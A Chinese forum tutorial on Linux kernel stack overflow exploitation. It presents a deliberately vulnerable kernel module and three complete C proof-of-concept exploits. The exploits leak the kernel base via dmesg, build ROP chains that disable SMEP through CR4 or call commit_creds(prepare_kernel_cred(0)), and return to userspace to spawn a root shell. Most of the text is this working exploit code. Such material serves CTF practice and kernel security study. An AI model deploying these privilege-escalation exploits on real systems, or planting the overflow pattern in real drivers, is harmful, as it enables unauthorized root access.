> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270080.htm)

> [原创]Kernel 从 0 开始 (二)

前言
==

先尝试下最简单的栈溢出，保护和未被保护的情况

 

给出自己设计的栈溢出题目：

```
#include #include #include #include #include #include #include #include #include #include //设备驱动常用变量
static char *buffer_var;
static struct class *devClass; // Global variable for the device class
static struct cdev cdev;
static dev_t stack_dev_no;
 
 
static ssize_t stack_read(struct file *filp, char __user *buf, size_t count,
        loff_t *f_pos);
 
static ssize_t stack_write(struct file *filp, const char __user *buf,
size_t len, loff_t *f_pos);
 
static long stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
 
// static int stack_open(struct inode *i, struct file *f)
// {
//   printk(KERN_INFO "[i] Module vuln: open()\n");
//   return 0;
// }
 
// static int stack_close(struct inode *i, struct file *f)
// {
//   printk(KERN_INFO "[i] Module vuln: close()\n");
//   return 0;
// }
 
static struct file_operations stack_fops =
        {
                .owner = THIS_MODULE,
                // .open = stack_open,
                // .release = stack_close,
                .write = stack_write,
                .read = stack_read
        };
 
// 设备驱动模块加载函数
static int __init stack_init(void)
{
    buffer_var=kmalloc(100,GFP_DMA);
    printk(KERN_INFO "[i] Module stack registered");
    if (alloc_chrdev_region(&stack_dev_no, 0, 1, "stack") < 0)
    {
        return -1;
    }
    if ((devClass = class_create(THIS_MODULE, "chardrv")) == NULL)
    {
        unregister_chrdev_region(stack_dev_no, 1);
        return -1;
    }
    if (device_create(devClass, NULL, stack_dev_no, NULL, "stack") == NULL)
    {
        printk(KERN_INFO "[i] Module stack error");
        class_destroy(devClass);
        unregister_chrdev_region(stack_dev_no, 1);
        return -1;
    }
    cdev_init(&cdev, &stack_fops);
    if (cdev_add(&cdev, stack_dev_no, 1) == -1)
    {
        device_destroy(devClass, stack_dev_no);
        class_destroy(devClass);
        unregister_chrdev_region(stack_dev_no, 1);
        return -1;
    }
 
    printk(KERN_INFO "[i] : <%d, %d>\n", MAJOR(stack_dev_no), MINOR(stack_dev_no));
    return 0;
 
}
 
// 设备驱动模块卸载函数
static void __exit stack_exit(void)
{
    // 释放占用的设备号
    unregister_chrdev_region(stack_dev_no, 1);
    cdev_del(&cdev);
}
 
 
// 读设备
ssize_t stack_read(struct file *filp, char __user *buf, size_t count,
        loff_t *f_pos)
{
    printk(KERN_INFO "Stack_read function" );
    if(strlen(buffer_var)>0) {
        printk(KERN_INFO "[i] Module vuln read: %s\n", buffer_var);
        kfree(buffer_var);
        buffer_var=kmalloc(100,GFP_DMA);
        return 0;
    } else {
        return 1;
    }
}
 
// 写设备
ssize_t stack_write(struct file *filp, const char __user *buf,
size_t len, loff_t *f_pos)
{
    printk(KERN_INFO "Stack_write function" );
    char buffer[100]={0};
    if (_copy_from_user(buffer, buf, len))
        return -EFAULT;
    buffer[len-1]='\0';
    printk("[i] Module stack write: %s\n", buffer);
    strncpy(buffer_var,buffer,len);
    return len;
}
 
 
 
// ioctl函数命令控制
long stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
        case 1:
            break;
        case 2:
            break;
        default:
            // 不支持的命令
            return -ENOTTY;
    }
    return 0;
}
 
 
module_init(stack_init);
module_exit(stack_exit);
 
MODULE_LICENSE("GPL");
// MODULE_AUTHOR("blackndoor");
// MODULE_DESCRIPTION("Module vuln overflow"); 
```

[](#▲寻找gadget)▲寻找 gadget
========================

`ropper`
--------

```
ropper --file vmlinux --search "pop|ret"

```

这个比较慢，实在不推荐

`objdump`
---------

```
objdump -d vmlinux -M intel | grep -E 'ret|pop'

```

这个比较快，不过查出来的 gadget 可能是不连续的，需要仔细辨别一下，必要时还需要 Gdb 调试进入 vmlinux 中进行汇编查询。比如查出来的类似如下

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930111208.png)

 

可以看到`pop rax`下并没有`ret`，但是依然查找出来了，其中`pop rax`和`pop rbx`不是连在一起的，用的时候注意辨别。

`ROPgadget`
-----------

依然可以用，但有时候可能比较慢，可以先保存下来，然后再找：

```
ROPgadget --binary vmlinux | grep "pop rdx ; ret"

```

一键获取
----

详见之前的项目中的`getKernelROP`命令，常用 gadget，还是比较好用的

 

[PIG-007/kernelAll (github.com)](https://github.com/PIG-007/kernelAll)

 

[PIG-007/kernelAll (gitee.com)](https://gitee.com/Piggy007/kernelAll)

[](#一、stack被保护)一、Stack 被保护
==========================

这里的被保护指的是开启了 SMEP，类似于 NX 的栈保护，即内核无法执行用户空间的代码。

[](#方法一：)方法一：
-------------

通过 ROP 来关闭掉 smep 保护，这样就可以进入内核之后启动用户空间我们自己构造的`commit_creds(prepare_kernel_cred(0))`来完成提权，之后再启一个 shell 即可获得提权之后的 shell。

1. 获取地址
-------

由于 read 函数不太有什么地址的读取，所以这里利用 dmesg 来获取地址

```
unsigned long findAddr() {
    char line[512];
    char string[] = "Freeing SMP alternatives memory";
    char found[17];
    unsigned long addr=0;
 
    /* execute dmesg and place result in a file */
    printf("[+] Excecute dmesg...\n");
    system("dmesg > /tmp/dmesg");
    /* find: Freeing SMP alternatives memory*/
    printf("[+] Find usefull addr...\n");
 
    FILE* file = fopen("/tmp/dmesg", "r");
 
    while (fgets(line, sizeof(line), file)) {
        if(strstr(line,string)) {
            strncpy(found,line+53,16);
            sscanf(found,"%p",(void **)&addr);
            break;
        }
    }
    fclose(file);
 
    if(addr==0) {
        printf("    dmesg error...\n");
        exit(1);
    }
    return addr;
}
 
//main函数中
unsigned long memOffset;
memOffset = findAddr();
unsigned long pop_rax_rbx_r12_rbp_ret = memOffset - 0xCB5B47;
unsigned long movCr4Rax_pop_rbp = (unsigned long)memOffset-0x01020F1C;
unsigned long getR = (unsigned long)getroot;
unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;
unsigned long iretq = (unsigned long)memOffset-0x7AC289;
unsigned long sh = (unsigned long)shell;

```

dmesg 是获取内核启动的日志相关信息，自己去尝试一下知道。

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930112655.png)

2. 关闭 SMEP
----------

```
unsigned char payload[300] = {0};
unsigned char *p           = payload;
 
/* pop rax;rbx;r12;rbp;ret;*/
unsigned long poprax = (unsigned long)memOffset-0xCB5B47;
memcpy(p,&poprax,8);
printf("    pop rax      at 0x%lx\n", poprax);
p+=8;
memcpy(p,"\xf0\x06\x00\x00\x00\x00\x00\x00",8);   /* SMEP OFF rax*/
p+=8;
memcpy(p,"\x00\x00\x00\x00\x00\x00\x00\x00",8);   /* rbx*/
p+=8;
memcpy(p,"\x00\x00\x00\x00\x00\x00\x00\x00",8);   /* r12 */
p+=8;
memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8);   /* rbp */
p+=8;
 
/* mov cr4, rax;rbp;ret     */
unsigned long movcr4 = (unsigned long)memOffset-0x01020F1C;
memcpy(p,&movcr4,8);
printf("    mov CR4, RAX at 0x%lx\n", movcr4);
p+=8;
memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8);   /* rbp */
p+=8;

```

3. 提权
-----

```
/* function to get root id */
void getroot (void)
{
  commit_creds(prepare_kernel_cred(0));
}
 
/* getroot                        */
memcpy(p,&getR,8);
p+=8;

```

4. 返回用户空间起 Shell
----------------

```
void shell(void) {
    printf("[+] getuid() ...");
    if(!getuid()) {
        printf(" [root]\n[+] Enjoy your shell...\n");
        system("/bin/sh");
    } else {
        printf("[+] not root\n[+] failed !!!\n");
    }
}

```

```
/* swapgs;ret           */
printf("    swapgs       at 0x%lx\n", swapgs);
memcpy(p,&swapgs,8);
p+=8;
 
/* iretq                          */
printf("    iretq        at 0x%lx\n", iretq);
memcpy(p,&iretq,8);
p+=8;
 
/* shell                          */
memcpy(p,&sh,8);
p+=8;

```

5. 设置寄存器保存和恢复
-------------

进入内核空间 ROP 链前需要保存环境，从内核环境回到用户空间起 shell 之前需要恢复环境。

### (1) 保存环境

```
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
 
static void save_state() {
  asm(
  "movq %%cs, %0\n"
  "movq %%ss, %1\n"
  "pushfq\n"
  "popq %2\n"
  : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory"     );
}

```

这个`save_state`函数在复制数据通过`stack_write`函数栈溢出进行 ROP 之前需要调用保存用户空间的环境。

### (2) 恢复环境

```
/* user_cs                        */
memcpy(p,&user_cs,8);
p+=8;
 
/* user_rflags                    */
memcpy(p,&user_rflags,8);
p+=8;
 
/*stack of userspace                 */        
register unsigned long rsp asm("rsp");
unsigned long sp = (unsigned long)rsp;
memcpy(p,&sp,8);
p+=8;
 
/* user_ss                        */
memcpy(p,&user_ss,8);

```

这个都是放在 ROP 链中，放在 shell 之后。

### poc

```
#include #include #include #include #include #include #include #include #include #include struct cred;
struct task_struct;
typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));
prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;
 
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
unsigned long stack;
 
 
unsigned long findAddr();
static void save_state();
void getroot (void);
void shell(void);
 
 
int main(int argc, char *argv[])
{
    int fd;
    unsigned char payload[300] = {0};
    unsigned char *p           = payload;
    unsigned long memOffset;
 
 
 
    memOffset = findAddr();
    unsigned long pop_rax_rbx_r12_rbp_ret = memOffset - 0xCB5B47;
    unsigned long movCr4Rax_pop_rbp = (unsigned long)memOffset-0x01020F1C;
    unsigned long getR = (unsigned long)getroot;
    unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;
    unsigned long iretq = (unsigned long)memOffset-0x7AC289;
    unsigned long sh = (unsigned long)shell;
 
    printf("    addr[0x%llx]\n", memOffset);
 
    /* set value for commit_creds and prepare_kernel_cred */
    commit_creds        = (commit_creds_t)(memOffset - 0xfbf6a0);
    prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xfbf2e0);
 
 
    /* open fd on /dev/vuln                             */
    printf("[+] Open vuln device...\n");
    if ((fd = open("/dev/stack", O_RDWR)) < 0) {
        printf("    Can't open device file: /dev/stack\n");
        exit(1);
    }
 
 
    /* payload                          */
    printf("[+] Construct the payload...\n");
    save_state();
    /* offset before RIP                    */
    memcpy(p,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",116);
    p+=116;
 
    memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8);   /* for rbp */
    p+=8;
 
    /* pop rax;rbx;r12;rbp;ret                    */
    memcpy(p,&pop_rax_rbx_r12_rbp_ret,8);
    printf("    pop rax      at 0x%lx\n", pop_rax_rbx_r12_rbp_ret);
    p+=8;
    memcpy(p,"\xf0\x06\x00\x00\x00\x00\x00\x00",8);   /* SMEP OFF */
    p+=8;
    memcpy(p,"\x00\x00\x00\x00\x00\x00\x00\x00",8);   /* rbx*/
    p+=8;
    memcpy(p,"\x00\x00\x00\x00\x00\x00\x00\x00",8);   /* r12 */
    p+=8;
    memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8);   /* rbp */
    p+=8;
 
    /* mov cr4, rax;rbp;ret     */
    memcpy(p,&movCr4Rax_pop_rbp,8);
    printf("    mov CR4, RAX at 0x%lx\n", movCr4Rax_pop_rbp);
    p+=8;
    memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8);   /* rbp */
    p+=8;
 
    /* getroot                        */
    memcpy(p,&getR,8);
    p+=8;
 
    /* swapgs;ret           */
    printf("    swapgs       at 0x%lx\n", swapgs);
    memcpy(p,&swapgs,8);
    p+=8;
 
    /* iretq                          */
    printf("    iretq        at 0x%lx\n", iretq);
    memcpy(p,&iretq,8);
    p+=8;
 
 
    /*
    the stack should look like this after an iretq call
      RIP
      CS
      EFLAGS
      RSP
      SS
    */
 
 
    /* shell                          */
    memcpy(p,&sh,8);
    p+=8;
 
    /* user_cs                        */
    memcpy(p,&user_cs,8);
    p+=8;
    /* user_rflags                    */
    memcpy(p,&user_rflags,8);
    p+=8;
    /*stack of userspace                 */        
    register unsigned long rsp asm("rsp");
    unsigned long sp = (unsigned long)rsp;
    memcpy(p,&sp,8);
    p+=8;
    /* user_ss                        */
    memcpy(p,&user_ss,8);
 
    /* trig the vuln                  */
    printf("[+] Trig the vulnerablity...\n");
    write(fd, payload, 300);
 
 
    return 0;
 
}
 
 
 
 
 
unsigned long findAddr() {
    char line[512];
    char string[] = "Freeing SMP alternatives memory";
    char found[17];
    unsigned long addr=0;
 
    /* execute dmesg and place result in a file */
    printf("[+] Excecute dmesg...\n");
    system("dmesg > /tmp/dmesg");
 
    /* find: Freeing SMP alternatives memory    */
    printf("[+] Find usefull addr...\n");
 
    FILE* file = fopen("/tmp/dmesg", "r");
 
 
    while (fgets(line, sizeof(line), file)) {
        if(strstr(line,string)) {
            strncpy(found,line+53,16);
            sscanf(found,"%p",(void **)&addr);
            break;
        }
    }
    fclose(file);
 
    if(addr==0) {
        printf("    dmesg error...\n");
        exit(1);
    }
 
    return addr;
}
 
static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory"     );
}
 
 
void shell(void) {
    printf("[+] getuid() ...");
    if(!getuid()) {
        printf(" [root]\n[+] Enjoy your shell...\n");
        system("/bin/sh");
    } else {
        printf("[+] not root\n[+] failed !!!\n");
    }
}
 
/* function to get root id */
void getroot (void)
{
    commit_creds(prepare_kernel_cred(0));
} 
```

[](#方法二：)方法二：
-------------

直接在内核空间利用地址和 gadget 构造`commit_creds(prepare_kernel_cred(0))`来完成提权，之后返回用户空间起 shell。

### 1.ROP 链

```
pop rdi;ret
0
prepare_kernel_cred_k
pop rdx;rbx;rbp;ret
pop rbp;ret
0
rbp_data
mov rdi,rax;call rdx
commit_creds_k
swapgs;ret
iretq

```

之后就是返回用户空间起 shell 了

### 2. 解析执行流程

▲先是调用`prepare_kernel_cred_k(0)`，然后通过将`pop rbp;ret`赋值给 rdx，之后`mov rdi,rax`，然后 call rdx，即调用`pop rbp;ret`，之后 ret 即可回到`commit_creds_k`。

 

这里较为麻烦的原因是因为`mov rdi,rax;call rdx`这个语句，需要赋值 rdi 才能进行`commit_creds`函数的执行，即将`prepare_kernel_cred_k(0)`返回值给`commit_creds`函数。

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200208.png)

 

赋值

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200230.png)

 

之后又因为存在 call 这个语句，所以多了`pop rbp;ret`来将栈平衡掉，，从而能够直接 ret 到 commit_creds

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200353.png)

 

同样 ha1vk 师傅的利用 jmp 就比较简单，不过具体看 gadget，有时候很难找。

### poc

```
#include #include #include #include #include #include #include #include #include #include unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
unsigned long stack;
 
 
unsigned long findAddr();
static void save_state();
void shell(void);
 
 
int main(int argc, char *argv[])
{
    int fd;
    unsigned char payload[300] = {0};
    unsigned char *p           = payload;
    unsigned long memOffset;
 
 
 
    memOffset = findAddr();
    unsigned long pop_rdi_ret = memOffset - 0xD17AF3;
    unsigned long pop_rdx_rbx_rbp_ret = (unsigned long)memOffset-0xCB43CD;
    unsigned long pop_rbp_ret = memOffset - 0xCB43CB;
    unsigned long movRdiRax_call_rdx = (unsigned long)memOffset-0xF8F3AA;
    unsigned long prepare_kernel_cred_k = (unsigned long)memOffset-0xFBF2E0;
    unsigned long commit_creds_k = (unsigned long)memOffset-0xFBF6A0;
    unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;
    unsigned long iretq = (unsigned long)memOffset-0x7AC289;
    unsigned long sh = (unsigned long)shell;
 
 
 
 
    printf("    addr[0x%llx]\n", memOffset);
 
    /* open fd on /dev/vuln                             */
    printf("[+] Open vuln device...\n");
    if ((fd = open("/dev/stack", O_RDWR)) < 0) {
        printf("    Can't open device file: /dev/stack\n");
        exit(1);
    }
 
 
    /* payload                          */
    printf("[+] Construct the payload...\n");
    save_state();
    /* offset before RIP                    */
    memcpy(p,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",116);
    p+=116;
 
    memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8);   /* for rbp */
    p+=8;
 
 
    /*
pop rdi;ret      ffffffff8131750d
0
prepare_kernel_cred_k_addr  
pop rdx;rbx;rbp;ret  0xffffffff8137ac33
commit_creds_k_addr
mov rdi,rax;call rdx     0xffffffff8109fc56
swags;    ....
pop rbp;ret; 0xffffffff8137ac35
0xdeadbeef
iretq; ....
shell;
CS
EFLAGS
RSP
SS
*/
 
 
    /* pop rdi;ret                    */
    printf("    pop rdi      at 0x%lx\n", pop_rdi_ret);
    memcpy(p,&pop_rdi_ret,8);
    p+=8;
    memcpy(p,"\x00\x00\x00\x00\x00\x00\x00\x00",8);   /* rbx*/
    p+=8;
 
    //prepare_kernel_cred_k
    printf("    prepare_kernel_cred_k_addr at 0x%lx\n", prepare_kernel_cred_k);
    memcpy(p,&prepare_kernel_cred_k,8);
    p+=8;
 
    //pop rdx;rbx;rbp;ret
    printf("    pop_rdx_rbx_rbp_ret at 0x%lx\n", pop_rdx_rbx_rbp_ret);
    memcpy(p,&pop_rdx_rbx_rbp_ret,8);
    p+=8;
 
 
    //pop rbp;ret
    printf("    pop_rbp_ret at 0x%lx\n", pop_rbp_ret);
    memcpy(p,&pop_rbp_ret,8);
    p+=8;
    memcpy(p,"\x00\x00\x00\x00\x00\x00\x00\x00",8); //rbx
    p+=8;
    memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8); //rbp
    p+=8;
 
 
 
    //mov rdi,rax;call rdx
    printf("    mov rdi,rax;call_rdx at 0x%lx\n", movRdiRax_call_rdx);
    memcpy(p,&movRdiRax_call_rdx,8);
    p+=8;
 
    //commit_creds_k
    printf("    commit_creds_k at 0x%lx\n", commit_creds_k);
    memcpy(p,&commit_creds_k,8);
    p+=8;
 
    /* swapgs;ret           */
    printf("    swapgs       at 0x%lx\n", swapgs);
    memcpy(p,&swapgs,8);
    p+=8;
 
    /* iretq                          */
    printf("    iretq        at 0x%lx\n", iretq);
    memcpy(p,&iretq,8);
    p+=8;
 
 
    /*
    the stack should look like this after an iretq call
      RIP
      CS
      EFLAGS
      RSP
      SS
    */
 
 
    /* shell                          */
    memcpy(p,&sh,8);
    p+=8;
 
    /* user_cs                        */
    memcpy(p,&user_cs,8);
    p+=8;
    /* user_rflags                    */
    memcpy(p,&user_rflags,8);
    p+=8;
    /*stack of userspace                 */        
    register unsigned long rsp asm("rsp");
    unsigned long sp = (unsigned long)rsp;
    memcpy(p,&sp,8);
    p+=8;
    /* user_ss                        */
    memcpy(p,&user_ss,8);
 
    /* trig the vuln                  */
    printf("[+] Trig the vulnerablity...\n");
    write(fd, payload, 300);
 
 
    return 0;
 
}
 
 
 
 
 
unsigned long findAddr() {
    char line[512];
    char string[] = "Freeing SMP alternatives memory";
    char found[17];
    unsigned long addr=0;
 
    /* execute dmesg and place result in a file */
    printf("[+] Excecute dmesg...\n");
    system("dmesg > /tmp/dmesg");
 
    /* find: Freeing SMP alternatives memory    */
    printf("[+] Find usefull addr...\n");
 
    FILE* file = fopen("/tmp/dmesg", "r");
 
 
    while (fgets(line, sizeof(line), file)) {
        if(strstr(line,string)) {
            strncpy(found,line+53,16);
            sscanf(found,"%p",(void **)&addr);
            break;
        }
    }
    fclose(file);
 
    if(addr==0) {
        printf("    dmesg error...\n");
        exit(1);
    }
 
    return addr;
}
 
static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory"     );
}
 
void shell(void) {
    printf("[+] getuid() ...");
    if(!getuid()) {
        printf(" [root]\n[+] Enjoy your shell...\n");
        system("/bin/sh");
    } else {
        printf("[+] not root\n[+] failed !!!\n");
    }
} 
```

[(15 条消息) linux kernel pwn 学习之 ROP_seaaseesa 的博客 - CSDN 博客](https://blog.csdn.net/seaaseesa/article/details/104575654?ops_request_misc=%7B%22request%5Fid%22%3A%22163298340616780366585344%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=163298340616780366585344&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-104575654.pc_v2_rank_blog_default&utm_term=kernel&spm=1018.2226.3001.4450)

[](#二、stack未被保护)二、Stack 未被保护
============================

解析
--

这个直接调用用户空间构造的`commit_creds(prepare_kernel_cred(0))`提权，然后直接原地起 shell 即可。相当于省去关闭 smep 保护的那段 ROP 链，直接 getroot 即可。

poc
---

```
#include #include #include #include #include #include #include #include #include #include struct cred;
struct task_struct;
typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));
prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;
 
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
unsigned long stack;
 
 
unsigned long findAddr();
static void save_state();
void getroot (void);
void shell(void);
 
 
int main(int argc, char *argv[])
{
    int fd;
    unsigned char payload[300] = {0};
    unsigned char *p           = payload;
    unsigned long memOffset;
 
 
 
    memOffset = findAddr();
    unsigned long pop_rax_rbx_r12_rbp_ret = memOffset - 0xCB5B47;
    unsigned long movCr4Rax_pop_rbp = (unsigned long)memOffset-0x01020F1C;
    unsigned long getR = (unsigned long)getroot;
    unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;
    unsigned long iretq = (unsigned long)memOffset-0x7AC289;
    unsigned long sh = (unsigned long)shell;
 
 
 
 
    printf("    addr[0x%llx]\n", memOffset);
 
    /* set value for commit_creds and prepare_kernel_cred */
    commit_creds        = (commit_creds_t)(memOffset - 0xfbf6a0);
    prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xfbf2e0);
 
 
    /* open fd on /dev/vuln                             */
    printf("[+] Open vuln device...\n");
    if ((fd = open("/dev/stack", O_RDWR)) < 0) {
        printf("    Can't open device file: /dev/stack\n");
        exit(1);
    }
 
 
    /* payload                          */
    printf("[+] Construct the payload...\n");
    save_state();
    /* offset before RIP                    */
    memcpy(p,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",116);
    p+=116;
 
    memcpy(p,"\x42\x42\x42\x42\x42\x42\x42\x42",8);   /* for rbp */
    p+=8;
 
 
    /* getroot                        */
    memcpy(p,&getR,8);
    p+=8;
 
    /* swapgs;ret           */
    printf("    swapgs       at 0x%lx\n", swapgs);
    memcpy(p,&swapgs,8);
    p+=8;
 
    /* iretq                          */
    printf("    iretq        at 0x%lx\n", iretq);
    memcpy(p,&iretq,8);
    p+=8;
 
 
    /*
    the stack should look like this after an iretq call
      RIP
      CS
      EFLAGS
      RSP
      SS
    */
 
 
    /* shell                          */
    memcpy(p,&sh,8);
    p+=8;
 
 
 
    /* user_cs                        */
    memcpy(p,&user_cs,8);
    p+=8;
    /* user_rflags                    */
    memcpy(p,&user_rflags,8);
    p+=8;
    /*stack of userspace                 */        
    register unsigned long rsp asm("rsp");
    unsigned long sp = (unsigned long)rsp;
    memcpy(p,&sp,8);
    p+=8;
    /* user_ss                        */
    memcpy(p,&user_ss,8);
 
    /* trig the vuln                  */
    printf("[+] Trig the vulnerablity...\n");
    write(fd, payload, 300);
 
 
    return 0;
 
}
 
 
 
 
 
unsigned long findAddr() {
    char line[512];
    char string[] = "Freeing SMP alternatives memory";
    char found[17];
    unsigned long addr=0;
 
    /* execute dmesg and place result in a file */
    printf("[+] Excecute dmesg...\n");
    system("dmesg > /tmp/dmesg");
 
    /* find: Freeing SMP alternatives memory    */
    printf("[+] Find usefull addr...\n");
 
    FILE* file = fopen("/tmp/dmesg", "r");
 
 
    while (fgets(line, sizeof(line), file)) {
        if(strstr(line,string)) {
            strncpy(found,line+53,16);
            sscanf(found,"%p",(void **)&addr);
            break;
        }
    }
    fclose(file);
 
    if(addr==0) {
        printf("    dmesg error...\n");
        exit(1);
    }
 
    return addr;
}
 
static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory"     );
}
 
void shell(void) {
    printf("[+] getuid() ...");
    if(!getuid()) {
        printf(" [root]\n[+] Enjoy your shell...\n");
        system("/bin/sh");
    } else {
        printf("[+] not root\n[+] failed !!!\n");
    }
}
 
/* function to get root id */
void getroot (void)
{
    commit_creds(prepare_kernel_cred(0));
} 
```

▲这里如果加了 SMEP 保护，那么就会出现下列的错误

```
unable to execute userspace code (SMEP?) (uid: 1000)

```

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211004100145.png)

[[注意] 欢迎加入看雪团队！base 上海，招聘安全工程师、逆向工程师多个坑位等你投递！](https://bbs.pediy.com/thread-267474.htm)